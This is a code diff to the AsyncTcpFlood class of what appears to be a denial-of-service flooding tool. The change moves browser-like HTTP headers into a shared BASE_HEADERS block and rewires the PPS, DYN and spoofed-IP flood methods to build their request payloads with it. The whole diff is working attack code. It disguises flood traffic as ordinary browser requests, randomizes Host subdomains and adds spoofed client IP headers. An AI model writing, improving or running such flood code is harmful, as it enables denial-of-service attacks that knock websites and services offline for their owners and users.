@@ -153,6 +153,20 @@ class AttackSettings:
 
 
 class AsyncTcpFlood:
+    BASE_HEADERS = (
+        'Accept-Encoding: gzip, deflate, br\r\n'
+        'Accept-Language: en-US,en;q=0.9\r\n'
+        'Cache-Control: max-age=0\r\n'
+        'Connection: Keep-Alive\r\n'
+        'Sec-Fetch-Dest: document\r\n'
+        'Sec-Fetch-Mode: navigate\r\n'
+        'Sec-Fetch-Site: none\r\n'
+        'Sec-Fetch-User: ?1\r\n'
+        'Sec-Gpc: 1\r\n'
+        'Pragma: no-cache\r\n'
+        'Upgrade-Insecure-Requests: 1\r\n'
+    )
+
     def __init__(
         self,
         target: URL,
@@ -206,8 +220,9 @@ class AsyncTcpFlood:
 
     def default_headers(self) -> str:
         return (
-            self.random_headers() +
             f"Host: {self._target.authority}\r\n"
+            + self.BASE_HEADERS
+            + self.random_headers()
         )
 
     def default_path_qs(self) -> str:
@@ -223,17 +238,6 @@ class AsyncTcpFlood:
         headers = headers or self.default_headers()
         request = (
             f"{self._req_type} {path_qs} HTTP/1.1\r\n"
-            'Accept-Encoding: gzip, deflate, br\r\n'
-            'Accept-Language: en-US,en;q=0.9\r\n'
-            'Cache-Control: max-age=0\r\n'
-            'Connection: Keep-Alive\r\n'
-            'Sec-Fetch-Dest: document\r\n'
-            'Sec-Fetch-Mode: navigate\r\n'
-            'Sec-Fetch-Site: none\r\n'
-            'Sec-Fetch-User: ?1\r\n'
-            'Sec-Gpc: 1\r\n'
-            'Pragma: no-cache\r\n'
-            'Upgrade-Insecure-Requests: 1\r\n'
             + headers
             + '\r\n'
         )
@@ -385,17 +389,15 @@ class AsyncTcpFlood:
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def PPS(self, on_connect=None) -> bool:
-        payload = (
-            f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
-            f"Host: {self._target.authority}\r\n\r\n"
-        ).encode()
+        payload = self.build_request(headers=f"Host: {self._target.authority}\r\n")
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def DYN(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                self.random_headers() +
                 "Host: %s.%s\r\n" % (Tools.rand_str(6), self._target.authority)
+                + self.BASE_HEADERS
+                + self.random_headers()
             )
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
@@ -404,10 +406,11 @@ class AsyncTcpFlood:
         payload: bytes = self.build_request(
             path_qs=self._target.raw_path_qs,
             headers=(
-                self.spoof_ip() +
                 f"Host: {self._target.authority}\r\n"
                 "User-Agent: null\r\n"
                 "Referrer: null\r\n"
+                + self.BASE_HEADERS
+                + self.spoof_ip()
             )
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
